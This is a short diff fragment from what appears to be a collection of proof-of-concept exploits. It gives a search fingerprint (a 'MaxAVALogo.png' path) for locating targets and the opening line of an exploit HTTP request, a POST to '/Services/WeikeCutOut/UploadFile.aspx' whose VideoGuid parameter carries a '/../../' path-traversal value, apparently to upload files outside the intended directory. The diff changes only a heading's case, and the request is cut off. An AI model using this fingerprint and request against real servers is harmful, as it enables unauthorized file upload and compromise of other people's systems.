@@ -8,7 +8,7 @@
 body="/Upload/DomainInfo/MaxAVALogo.png"
 ```
 
-## poc
+## POC
 
 ```java
 POST /Services/WeikeCutOut/UploadFile.aspx?VideoGuid=/../../ HTTP/1.1
